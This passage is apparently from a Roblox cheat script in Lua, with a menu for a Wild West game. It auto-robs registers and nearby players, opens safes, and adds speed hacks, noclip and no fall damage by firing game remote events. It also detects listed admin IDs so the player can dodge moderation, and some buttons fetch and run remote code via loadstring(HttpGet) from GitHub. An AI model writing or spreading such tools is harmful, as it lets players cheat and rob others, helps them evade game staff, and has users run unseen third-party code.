        _G.AntiAfk = Value
        if Value then
            -- Notificação inicial
            showNotification("Anti AFK Activated. You will not be kicked for 20 minutes of inactivity.")

            local bb = game:GetService('VirtualUser')
            game:GetService('Players').LocalPlayer.Idled:Connect(function()
                -- Previne o kick ao capturar a inatividade
                bb:CaptureController()
                bb:ClickButton2(Vector2.new())
                
                -- Notificação quando Anti-AFK age
                showNotification("Roblox tried to kick you, but Anti AFK prevented it.")
            end)
        else
            -- Desativa a função Anti AFK
            _G.AntiAfk = false
            showNotification("Anti AFK Disabled.")
        end
    end    
})
--ku

-- ServiÃ§os
local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- VariÃ¡veis
local lastRegister = nil
local teleportDistance = 300 -- DistÃ¢ncia mÃ¡xima de teleporte
local registersInRange = {} -- Lista de registers no alcance
local autoRobEnabled = false -- VariÃ¡vel para controle do toggle
local robLoop, teleportLoop = nil, nil -- VariÃ¡veis para os loops
local fortCassidyLoop = nil -- Loop para o evento especial

-- FunÃ§Ã£o para encontrar os registers dentro do alcance
local function updateRegistersInRange()
    registersInRange = {}

    -- Itera sobre todos os registros disponÃ­veis na workspace
    for _, register in pairs(workspace:GetDescendants()) do
        if register:IsA("Model") and register:FindFirstChild("Union") and register:FindFirstChild("Open") and register:FindFirstChild("Active") then
            local distance = (humanoidRootPart.Position - register.Union.Position).Magnitude
            if distance <= teleportDistance and register ~= lastRegister then
                table.insert(registersInRange, register)
            end
        end
    end
end

-- FunÃ§Ã£o para disparar o evento de spawn
local function spawnTumbleweedOrStoneCreek()
    local randomEvent = math.random(1, 2) -- Escolhe aleatoriamente entre 1 e 2
    if randomEvent == 1 then
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("StoneCreek", false, false)
    else
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("Tumbleweed", false, false)
    end
end

-- FunÃ§Ã£o para teletransportar para o register mais prÃ³ximo
local function teleportToRegister()
    if #registersInRange == 0 then return end -- Verifica se hÃ¡ registers no alcance

    local register = registersInRange[1] -- Pega o primeiro register da lista
    local registerPosition = register.Union.Position + Vector3.new(0, register.Union.Size.Y / 2, 0) -- Ajusta para a parte superior do register
    local distance = (humanoidRootPart.Position - registerPosition).Magnitude
    local time = distance / 360 -- Ajusta a velocidade do teleporte
    local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
    local goal = {CFrame = CFrame.new(registerPosition)}

    -- CriaÃ§Ã£o e execuÃ§Ã£o do Tween
    local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
    tween:Play()
    
    -- Espera o teleporte terminar e entÃ£o define o Ãºltimo register
    tween.Completed:Wait()
    lastRegister = register
end

-- FunÃ§Ã£o para realizar o roubo dos registers
local function robNearestRegister()
    for _, register in pairs(registersInRange) do
        -- Dispara o evento de roubo
        game:GetService("ReplicatedStorage").GeneralEvents.Rob:FireServer("Register", {
            ["Part"] = register.Union,
            ["OpenPart"] = register.Open,
            ["ActiveValue"] = register.Active,
            ["Active"] = true
        })
    end
end

-- FunÃ§Ã£o principal para controle do roubo e teleporte
local function startAutoRob()
    -- Desconecta os loops antigos, se existirem
    if robLoop then
        robLoop:Disconnect()
        robLoop = nil
    end
    if teleportLoop then
        teleportLoop:Disconnect()
        teleportLoop = nil
    end

    robLoop = spawn(function() -- Loop separado para roubo
        while autoRobEnabled do
            robNearestRegister() -- Dispara o evento de roubo a cada segundo
            wait(2) -- Intervalo de 1 segundo entre cada roubo
        end
        robLoop = nil -- Limpa a variÃ¡vel quando o loop termina
    end)

    teleportLoop = spawn(function() -- Loop separado para teleporte
        while autoRobEnabled do
            updateRegistersInRange() -- Atualiza a lista de registers dentro do alcance
            if #registersInRange == 0 then
                spawnTumbleweedOrStoneCreek() -- Dispara o evento de spawn se nÃ£o houver registers
                wait(1) -- Espera 1 segundo antes de iniciar o auto farm
            else
                teleportToRegister() -- Teleporta para o prÃ³ximo register
            end
            wait(3) -- Espera 2 segundos antes de tentar teleportar de novo
        end
        teleportLoop = nil -- Limpa a variÃ¡vel quando o loop termina
    end)
end

-- FunÃ§Ã£o para reiniciar o script ao reaparecer o personagem
local function onCharacterAdded(newCharacter)
    -- Desconecta os loops antigos imediatamente
    if robLoop then
        robLoop:Disconnect()
        robLoop = nil
    end
    if teleportLoop then
        teleportLoop:Disconnect()
        teleportLoop = nil
    end

    character = newCharacter
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Reinicia o auto rob
    startAutoRob()
end

-- Adiciona um evento para detectar quando o personagem reaparece
player.CharacterAdded:Connect(onCharacterAdded)

-- FunÃ§Ã£o para executar o evento especial de FortCassidy a cada 7 segundos
local function startFortCassidyEvent()
    spawn(function()
        while autoRobEnabled do -- Verifica se o toggle estÃ¡ ativo
            -- Dispara o evento de FortCassidy
            game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("FortCassidy", true, false)
            wait(1)

            -- Simula desativar o script como se o toggle tivesse sido desativado
            autoRobEnabled = false
            if robLoop then
                robLoop:Disconnect()
                robLoop = nil
            end
            if teleportLoop then
                teleportLoop:Disconnect()
                teleportLoop = nil
            end

            wait(1) -- Espera 1 segundo

            -- Simula reativar o script como se o toggle tivesse sido reativado
            autoRobEnabled = true
            startAutoRob()

            wait(6) -- Aguarda mais 6 segundos para totalizar 7 segundos
        end
    end)
end

 local Section = FarmingTab:AddSection({
	Name = "Auto Farming Premium"
})  
            
          
    FarmingTab:AddToggle({
        Name = "Auto Farm Rob Registers",
        Default = false,
        Callback = function(Value)
            autoRobEnabled = Value
            if autoRobEnabled then
                startAutoRob()
                startFortCassidyEvent()
            else
                if robLoop then
                    robLoop:Disconnect()
                    robLoop = nil
                end
                if teleportLoop then
                    teleportLoop:Disconnect()
                    teleportLoop = nil
                end
                if fortCassidyLoop then
                    fortCassidyLoop:Disconnect()
                    fortCassidyLoop = nil
                end
            end
        end
    })


    -- Inicia o auto rob se o toggle jÃ¡ estiver ativado
    if autoRobEnabled then
        startAutoRob()
        startFortCassidyEvent()
    end
    




            
local Section = FarmingTab:AddSection({
	Name = "Auto Farm Private [350k Money in hour]"
})
            
if _G.Premium then            
FarmingTab:AddButton({
    Name = "Auto Farm Money [Private]",
    Callback = function()
        print("button pressed")
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Aspherian-EC/Fun-es/refs/heads/main/FarmPrivateWest'))()
    end    
})
else
        Section:AddLabel("Resources available only for premium users!")
end     
            
local Section = FarmingTab:AddSection({
	Name = "Not Auto Farm"
})

-- VariÃ¡vel para controlar o estado do Auto Sell
local autoSell = false  

-- FunÃ§Ã£o que serÃ¡ chamada a cada 1 segundo quando o toggle estiver ativo
local function sellItem()
    while autoSell do
        game:GetService("ReplicatedStorage").GeneralEvents.Inventory:InvokeServer("Sell")
        wait(1)  -- Espera 1 segundo antes de repetir
    end
end

-- Toggle para Auto Sell [Inventory itens]
FarmingTab:AddToggle({
    Name = "Auto Sell [Inventory itens]",
    Default = false,
    Callback = function(Value)
        autoSell = Value  -- Atualiza o estado do toggle

        if autoSell then
            -- Inicia o loop de venda quando o toggle for ativado
            spawn(sellItem)  -- Usando spawn para nÃ£o bloquear o resto do cÃ³digo
        end
    end    
})

--⚠️⚠️

--auto rob players bruto

-- Configurações
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local range = 20 -- Distância em metros
local toggleActive = false -- Estado inicial do toggle

-- Função para detectar jogadores próximos e disparar o evento
local function detectAndFire()
    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
        -- Ignora o próprio jogador
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local otherHumanoidRootPart = otherPlayer.Character.HumanoidRootPart
            local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).Magnitude
            
            -- Verifica se o jogador está dentro da distância especificada
            if distance <= range then
                -- Dispara o evento no jogador detectado
                game:GetService("ReplicatedStorage").GeneralEvents.Rob:FireServer(
                    "Player",
                    otherPlayer,
                    otherHumanoidRootPart
                )
            end
        end
    end
end

-- Loop controlado pelo toggle
task.spawn(function()
    while task.wait(1) do
        if toggleActive then
            detectAndFire()
        end
    end
end)

-- Botão toggle
FarmingTab:AddToggle({
    Name = "Auto Rob Players (Aura Nearest)",
    Default = false,
    Callback = function(Value)
        toggleActive = Value -- Atualiza o estado do toggle
        if toggleActive then
            print("Auto Rob ativado!")
        else
            print("Auto Rob desativado!")
        end
    end    
})



--⚠️⚠️

if _G.Premium then
-- Variável para controlar o estado do toggle
local toggleActive = false

-- Configuração do toggle
FarmingTab:AddToggle({
    Name = "Auto Skin Animals (Aura)",
    Default = false,
    Callback = function(Value)
        toggleActive = Value
        print("Auto Skin Animals:", toggleActive)
    end
})

else
    Section:AddLabel("Resource available only for premium users!")
end

-- Script para detectar e disparar o evento
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local event = game:GetService("ReplicatedStorage").GeneralEvents.SkinAnimal
local range = 10 -- Distância de detecção em metros

-- Função para verificar se é um player
local function isPlayer(part)
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") == part then
            return true
        end
    end
    return false
end

-- Função para verificar os objetos próximos
local function detectAndFire()
    for _, object in ipairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and object.Name == "HumanoidRootPart" and not isPlayer(object) then
            local distance = (humanoidRootPart.Position - object.Position).Magnitude
            if distance <= range then
                local parent = object.Parent
                if parent and parent:FindFirstChildOfClass("Humanoid") then
                    local typeName = parent.Name -- Nome do modelo ou tipo do objeto
                    event:FireServer(parent) -- Disparar evento para o objeto detectado
                end
            end
        end
    end
end

-- Loop para executar enquanto o toggle estiver ativado
task.spawn(function()
    while true do
        if toggleActive then
            detectAndFire()
        end
        task.wait(0.5) -- Intervalo entre verificações
    end
end)

--⚠️⚠️

-- VariÃ¡vel para controlar se o Auto Dig estÃ¡ ativo
local autoDigActive = false

-- FunÃ§Ã£o para gerar coordenadas aleatÃ³rias ao redor do personagem
local function generateRandomCoordinates(centerPosition, radius, count)
    local coordinates = {}
    
    for i = 1, count do
        local offsetX = math.random() * 2 * radius - radius
        local offsetY = math.random() * 2 * radius - radius
        local offsetZ = math.random() * 2 * radius - radius
        
        if (offsetX^2 + offsetZ^2 <= radius^2) then
            local newPosition = centerPosition + Vector3.new(offsetX, offsetY, offsetZ)
            table.insert(coordinates, newPosition)
        end
    end
    
    return coordinates
end

-- FunÃ§Ã£o para executar a escavaÃ§Ã£o na Ã¡rea
local function digInArea(centerPosition, radius, count)
    local coordinates = generateRandomCoordinates(centerPosition, radius, count)
    
    local args = {}
    for i, coord in ipairs(coordinates) do
        table.insert(args, coord)
    end
    
    local player = game:GetService("Players").LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("Pickaxe") then
        player.Character.Pickaxe.Dig:FireServer(unpack(args))
    else
        warn("Pickaxe not found in character")
    end
end

-- FunÃ§Ã£o para ignorar a mira e desativar o Shiftlock
local function handleVisualDistractions()
    local player = game:GetService("Players").LocalPlayer
    if player and player.PlayerGui then
        -- Desativa a mira na tela
        local crosshair = player.PlayerGui:FindFirstChild("Crosshair") -- Nome do elemento de mira
        if crosshair then
            crosshair.Visible = false
        end
    end

    local playerScripts = player:FindFirstChild("PlayerScripts")
    if playerScripts then
        -- Desativa o Shiftlock, se aplicÃ¡vel
        local shiftlockScript = playerScripts:FindFirstChild("ShiftlockScript") -- Nome do script de Shiftlock
        if shiftlockScript then
            shiftlockScript.Disabled = true
        end
    end
end

-- ParÃ¢metros
local player = game:GetService("Players").LocalPlayer
local radius = 5 -- Raio em metros
local count = 2 -- NÃºmero de coordenadas a serem geradas

-- Substituindo o botÃ£o por um toggle
FarmingTab:AddToggle({
    Name = "Auto Dig Caves",
    Default = false,
    Callback = function(Value)
        autoDigActive = Value -- Atualiza o estado do Auto Dig com base no toggle
        print(Value)
    end    
})

-- Usa 'spawn' para rodar o loop contÃ­nuo sem bloquear a interface
spawn(function()
    while true do
        if autoDigActive then -- SÃ³ executa se o toggle estiver ativado
            local centerPosition = player.Character.HumanoidRootPart.Position
            handleVisualDistractions()
            digInArea(centerPosition, radius, count)
        end
        wait(0.3) -- Atualiza a cada 0.3 segundos
    end
end)


          
-- ReferÃªncias aos serviÃ§os 
local tweenService = game:GetService("TweenService")
local workspace = game:GetService("Workspace")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- FunÃ§Ã£o para abrir todos os cofres
local function openAllSafes()
    local safes = {}
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Model") and obj.Name == "Safe" then
            table.insert(safes, obj)
        end
    end

    for _, safe in pairs(safes) do
        if safe:FindFirstChild("OpenSafe") then
            safe.OpenSafe:FireServer("Complete")
        end
    end
end

FarmingTab:AddButton({
    Name = "Open All Safe's Bank [Nearest]",
    Callback = function()
        print("button pressed")
        openAllSafes()
        print("Todos os cofres foram abertos.")
    end    
})

--ï¸âš ï¸

local MiscTab = Window:MakeTab({
    Name = "Misc",
    Icon = "rbxassetid://76275369017446",
    PremiumOnly = false
})

local Section = MiscTab:AddSection({
	Name = "Services"
})


local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- IDs dos admins
local adminIDs = {
    69293582,
    40279015,
    35405099,
    73837839,
    35261656,
    110544176,
    109506442,
    29945409,
    65036998,
    648984391,
    87100787,
    3111449,
    721757784,
    1168878
}

local function teleportPlayer()
    local player = Players.LocalPlayer
    local placeId = game.PlaceId -- ID do lugar atual
    local teleportOptions = {} -- Adicione opÃ§Ãµes de teleporte, se necessÃ¡rio
    
    -- Teleportar o jogador para outro servidor do mesmo lugar
    TeleportService:Teleport(placeId, player, teleportOptions)
end

local function notifyAndTeleport()
    local player = Players.LocalPlayer
    player:Kick("âš ï¸ Admin Detected. Server Hoping in 5 Seconds âš ï¸.")
    
    wait(5) -- Espera 5 segundos antes de tentar teleportar (isso nÃ£o funcionarÃ¡ apÃ³s o Kick)
    teleportPlayer() -- Isso nÃ£o serÃ¡ alcanÃ§ado, mas mantÃ©m a estrutura
end

local function checkForAdmins()
    local adminPresent = false
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(adminIDs, player.UserId) then
            adminPresent = true
            break
        end
    end
    
    if adminPresent then
        notifyAndTeleport() -- Notificar e tentar teleportar o jogador
    else
        print("Nenhum admin no servidor")
    end
end

local function onPlayerAdded(player)
    -- Verifica se o jogador adicionado Ã© um admin
    if table.find(adminIDs, player.UserId) then
        notifyAndTeleport() -- Notificar e tentar teleportar o jogador
    end
end

-- Conectar o evento quando um jogador entra
Players.PlayerAdded:Connect(onPlayerAdded)

-- Monitorar o toggle para saber quando ativar/desativar a verificaÃ§Ã£o
local isToggleActive = false

-- FunÃ§Ã£o para exibir notificaÃ§Ãµes
local function showNotification(message)
    local notification = loadstring(game:HttpGet('https://raw.githubusercontent.com/9menta/tests/refs/heads/main/notification.lua'))()
    notification({
        Title = 'Client Premium Protection',
        Text = message,
        Image = 'rbxassetid://72671288986713',
        Duration = 10
    })
end

if _G.Premium then
MiscTab:AddToggle({
    Name = "Admin Detector",
    Default = true,
    Callback = function(Value)
        isToggleActive = Value
        print("Toggle ativado:", isToggleActive)
        
        -- Exibir a notificaÃ§Ã£o dependendo do estado do toggle
        if isToggleActive then
            showNotification("Anti Admin is Enabled. You are being protected.")
        else
            showNotification("Danger! Don't turn this off. We are not responsible if you are banned by admins.")
        end
    end    
})
else
        Section:AddLabel("Resources available only for premium users!")
end 

-- Verificar administradores no servidor ao iniciar
checkForAdmins()

-- Utilizar 'spawn' para rodar a verificaÃ§Ã£o em paralelo com o restante do cÃ³digo
spawn(function()
    while true do
        wait(5) -- Verifica a cada 5 segundos
        if isToggleActive then
            checkForAdmins() -- SÃ³ verifica se o toggle estiver ativado
        end
    end
end)


-- ConfiguraÃ§Ã£o inicial de velocidade
local velocidade = 4
local speedHackAtivo = false  -- Estado inicial do toggle

-- Toggle para ativar/desativar o Speed Hack (novo formato)
MiscTab:AddToggle({
    Name = "Speed Hack",
    Default = false,
    Callback = function(state)
        speedHackAtivo = state  -- Atualiza o estado do toggle
    end    
})

-- Slider para ajustar a velocidade do Speed Hack (novo formato)
MiscTab:AddSlider({
    Name = "Speed Hack",
    Min = 1,
    Max = 20,
    Default = velocidade,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "Velocity",
    Callback = function(value)
        velocidade = value  -- Atualiza a velocidade com base no valor do slider
    end    
})

-- FunÃ§Ã£o de TPWalk com base no movimento do jogador
game:GetService("RunService").Stepped:Connect(function()
    if speedHackAtivo then  -- Verifica se o Speed Hack estÃ¡ ativado
        local player = game.Players.LocalPlayer
        local character = player.Character

        if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
            -- Pega a direÃ§Ã£o em que o jogador estÃ¡ movendo
            local moveDirection = character.Humanoid.MoveDirection
            -- Ajusta a posiÃ§Ã£o do personagem para simular o TPWalk
            character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame + moveDirection * velocidade * 0.1
        end
    end
end)

local Section = MiscTab:AddSection({
	Name = "Complement"
})
            
local toggleActive = false

MiscTab:AddToggle({
	Name = "Auto Broken Lasso",
	Default = false,
	Callback = function(Value)
		toggleActive = Value -- Atualiza o estado do toggle
		print("Toggle status:", toggleActive)
		
		if toggleActive then
			-- Dispara o evento repetidamente enquanto o toggle estiver ativo
			spawn(function()
				while toggleActive do
					game:GetService("ReplicatedStorage").GeneralEvents.LassoEvents:FireServer("BreakFree")
					wait(0.3) -- Aguarda 0.3 segundos antes de disparar novamente
				end
			end)
		end
	end
})

-- Variáveis
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local noFallEnabled = false -- Controlador do toggle

-- Função para ativar/desativar NoFall
local function toggleNoFall(state)
    noFallEnabled = state

    if noFallEnabled then
        -- Conecta eventos enquanto o toggle estiver ativado
        humanoid.StateChanged:Connect(function(_, newState)
            if noFallEnabled and newState == Enum.HumanoidStateType.Freefall then
                humanoid:ChangeState(Enum.HumanoidStateType.Landed)
            end
        end)

        humanoid:GetPropertyChangedSignal("FloorMaterial"):Connect(function()
            if noFallEnabled and humanoid.FloorMaterial == Enum.Material.Air then
                humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                humanoid.Velocity = Vector3.new(0, -10, 0)
            end
        end)

        humanoid.HealthChanged:Connect(function(health)
            if noFallEnabled and health < humanoid.MaxHealth then
                humanoid.Health = humanoid.MaxHealth
            end
        end)

        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
    else
        -- Reseta o estado quando o toggle é desativado
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
    end
end

-- Garante que o script continue funcionando após respawn
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild("Humanoid")
    if noFallEnabled then
        toggleNoFall(true)
    end
end)

if _G.Premium then
-- Toggle do menu
MiscTab:AddToggle({
    Name = "No Fall Damage [Premium]",
    Default = false,
    Callback = function(Value)
        print("Toggle State:", Value)
        toggleNoFall(Value)
    end
})
else
        Section:AddLabel("Resources available only for premium users!")
end 

-- VariÃ¡vel para armazenar o estado do script de antivoid
local isAntivoidActive = false
local connection -- VariÃ¡vel para armazenar a conexÃ£o do evento

-- FunÃ§Ã£o para carregar o script de proteÃ§Ã£o ao clicar no botÃ£o
local function LoadVoidProtection()
    -- Aqui vai o cÃ³digo do script de antivoid
    local platformSize = Vector3.new(10, 1, 10) -- Tamanho da plataforma
    local platformColor = BrickColor.new("Bright red") -- Cor da plataforma
    local checkDistance = 6 -- DistÃ¢ncia para verificar se a plataforma deve desaparecer
    local platformHeight = 1 -- Altura da plataforma abaixo dos pÃ©s do personagem

    local function createPlatform()
        local platform = Instance.new("Part")
        platform.Size = platformSize
        platform.BrickColor = platformColor
        platform.Anchored = true
        platform.CanCollide = true
        platform.Parent = game.Workspace
        return platform
    end

    local platform

    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character then
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local currentPosition = humanoidRootPart.Position

            -- Verifica se a posiÃ§Ã£o Y Ã© menor ou igual a 0 e cria a plataforma se nÃ£o existir
            if currentPosition.Y <= 0 then
                if not platform then
                    platform = createPlatform()
                end

                -- Atualiza a posiÃ§Ã£o da plataforma abaixo do personagem
                platform.Position = Vector3.new(currentPosition.X, currentPosition.Y - humanoidRootPart.Size.Y/2 - platformHeight, currentPosition.Z)
            end

            -- Verifica a distÃ¢ncia entre o personagem e a plataforma
            if platform then
                local distance = (humanoidRootPart.Position - platform.Position).Magnitude
                if distance > checkDistance then
                    platform:Destroy()
                    platform = nil
                end
            end
        end
    end)
end

if _G.Premium then
-- Novo botÃ£o toggle para AntiVoid com a nova estrutura
MiscTab:AddToggle({
    Name = "Anti Void",
    Default = false,
    Callback = function(Value)
        if Value then
            if not isAntivoidActive then
                LoadVoidProtection()
                isAntivoidActive = true
            end
        else
            if isAntivoidActive then
                if connection then
                    connection:Disconnect() -- Desconecta o evento quando desativado
                end
                isAntivoidActive = false
            end
        end
        print("Anti Void", Value and "ativado" or "desativado")
    end    
})
else
        Section:AddLabel("Resources available only for premium users!")
end 

-- VariÃ¡vel para controlar o estado do NoClip
local isNoClipActive = false

-- FunÃ§Ã£o para ativar ou desativar o NoClip
local function toggleNoClip(state)
    local player = game.Players.LocalPlayer
    local character = player.Character
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        local parts = character:GetChildren()

        for _, part in pairs(parts) do
            if part:IsA("BasePart") then
                part.CanCollide = not state
            end
        end
    end
end

-- Novo botÃ£o toggle para NoClip com a nova estrutura
MiscTab:AddToggle({
    Name = "NoClip",
    Default = false,
    Callback = function(Value)
        isNoClipActive = Value
        toggleNoClip(isNoClipActive)
        print("NoClip", Value and "ativado" or "desativado")
    end    
})

local Section = MiscTab:AddSection({
	Name = "Server Service"
})


-- FunÃ§Ã£o de rejoin
local function rejoinGame()
    local player = game.Players.LocalPlayer
    local teleportService = game:GetService("TeleportService")

    -- Espera um pouco para garantir que a desconexÃ£o ocorreu
    wait(2)

    -- Tenta reconectar o jogador ao mesmo lugar
    local success, message = pcall(function()
        teleportService:Teleport(game.PlaceId, player)
    end)

    if not success then
        warn("Failed to rejoin the game: " .. message)
    end
end

-- Novo botÃ£o
MiscTab:AddButton({
    Name = "Rejoin Server",
    Callback = function()
        rejoinGame()  -- Chama a funÃ§Ã£o de rejoin
    end    
})



local ShopTab = Window:MakeTab({
    Name = "Shop",
    Icon = "rbxassetid://77313508884748",
    PremiumOnly = false
})

local Section = ShopTab:AddSection({
	Name = "Buy item Consumable"
})


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GeneralEvents = ReplicatedStorage:WaitForChild("GeneralEvents")
local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer

-- Função para obter o personagem
local function getCharacter()
    return player.Character or player.CharacterAdded:Wait()
end

-- Função para unequipar a ferramenta atualmente equipada
local function unequipCurrentTool()
    local character = getCharacter()
    local currentTool = character:FindFirstChildOfClass("Tool")

    if currentTool then
        currentTool.Parent = player.Backpack
    end
end

-- Lista das coordenadas atualizadas
local positions = {
    Vector3.new(-237, 13, -22),
    Vector3.new(927, 24, 139),
    Vector3.new(1467, 123, 1557),
    Vector3.new(-1569, -36, 1566),
    Vector3.new(1720, 104, -1820),
    Vector3.new(-1306, 160, -653),
    Vector3.new(-52, 72, 1257),
}

-- Função para executar um evento 15 vezes
local function executeEvent(eventName, withTrue)
    for i = 1, 15 do
        GeneralEvents.BuyItem:InvokeServer(eventName, withTrue)
    end
end

-- Função para encontrar a posição mais próxima
local function getClosestPosition()
    local character = getCharacter()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local closestPosition = nil
    local shortestDistance = math.huge

    for _, pos in ipairs(positions) do
        local distance = (humanoidRootPart.Position - pos).Magnitude
        if distance < shortestDistance then
            shortestDistance = distance
            closestPosition = pos
            
            if shortestDistance < 200 then
                break
            end
        end
    end

    return closestPosition, shortestDistance
end

-- Teletransporte + compra com verificação mínima de distância
local function teleportToClosestPosition(eventName, withTrue)
    local character = getCharacter()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local closestPosition, distance = getClosestPosition()
    
    if closestPosition then
        if distance < 400 then
            local time = distance / 360
            local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
            local goal = {CFrame = CFrame.new(closestPosition)}

            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
            tween:Play()
            tween.Completed:Connect(function()
                -- Só dispara o evento se estiver a pelo menos 0.5 studs do ponto
                local finalDist = (humanoidRootPart.Position - closestPosition).Magnitude
                if finalDist <= 0.5 then
                    executeEvent(eventName, withTrue)
                end
            end)
        else
            GeneralEvents.Spawn:FireServer("Tumbleweed", false, false)
            local finalDist = (humanoidRootPart.Position - closestPosition).Magnitude
            if finalDist <= 0.5 then
                executeEvent(eventName, withTrue)
            end
        end
    end
end

-- Itens de munição / consumíveis
ShopTab:AddButton({
    Name = "Buy Full (Pistol Ammo)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("PistolAmmo")
    end    
})

ShopTab:AddButton({
    Name = "Buy Full (BIG Dynamite)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("BIG Dynamite")
    end    
})

ShopTab:AddButton({
    Name = "Buy Full (Shotgun Ammo)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("ShotgunAmmo")
    end    
})

ShopTab:AddButton({
    Name = "Buy Full (Sniper Ammo)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("SniperAmmo")
    end    
})

ShopTab:AddButton({
    Name = "Buy Full (Rifle Ammo)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("RifleAmmo", true)
    end    
})

ShopTab:AddButton({
    Name = "Buy Full (Health Potion)",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("Health Potion", true)
    end    
})

-- Seção de armas
local gunSection = ShopTab:AddSection({
	Name = "Buy Guns"
})

ShopTab:AddButton({
    Name = "Buy Mondragon",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("Mondragon")
    end    
})

ShopTab:AddButton({
    Name = "Buy Mauser Pistol",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("Mauser Pistol")
    end    
})

ShopTab:AddButton({
    Name = "Buy Machete",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("Machete")
    end    
})

ShopTab:AddButton({
    Name = "Buy Lasso",
    Callback = function()
        unequipCurrentTool()
        teleportToClosestPosition("Lasso")
    end    
})

local TpTab = Window:MakeTab({
    Name = "Teleports",
    Icon = "rbxassetid://80258870016253",
    PremiumOnly = false
})

local Section = TpTab:AddSection({
	Name = "Teleport on City"
})

local player = game.Players.LocalPlayer -- Para LocalScript

-- FunÃ§Ã£o para unequipar a ferramenta atualmente equipada
local function unequipCurrentTool()
    local character = player.Character or player.CharacterAdded:Wait()
    local currentTool = character:FindFirstChildOfClass("Tool")

    if currentTool then
        currentTool.Parent = player.Backpack -- Move a ferramenta de volta para o Backpack
    end
end

-- FunÃ§Ã£o para criar os botÃµes atualizados
TpTab:AddButton({
    Name = "Tp to Grayridge",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("Grayridge", false, false)
    end
})

TpTab:AddButton({
    Name = "Tp to Tumbleweed",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("Tumbleweed", false, false)
    end
})

TpTab:AddButton({
    Name = "Tp to Quarry",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("Quarry", false, false)
    end
})

TpTab:AddButton({
    Name = "Tp to StoneCreek",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("StoneCreek", false, false)
    end
})

--ðŸŸ¡ðŸŸ¡ðŸŸ¡
local Section = TpTab:AddSection({
	Name = "Teleport Ontlaws Bases"
})

TpTab:AddButton({
    Name = "Tp to RedRocks",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("RedRocks", true, false)
    end
})

TpTab:AddButton({
    Name = "Tp to FortArthur",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("FortArthur", true, false)
    end
})

TpTab:AddButton({
    Name = "Tp to FortCassidy",
    Callback = function()
        unequipCurrentTool()  -- Chama a funÃ§Ã£o antes do spawn
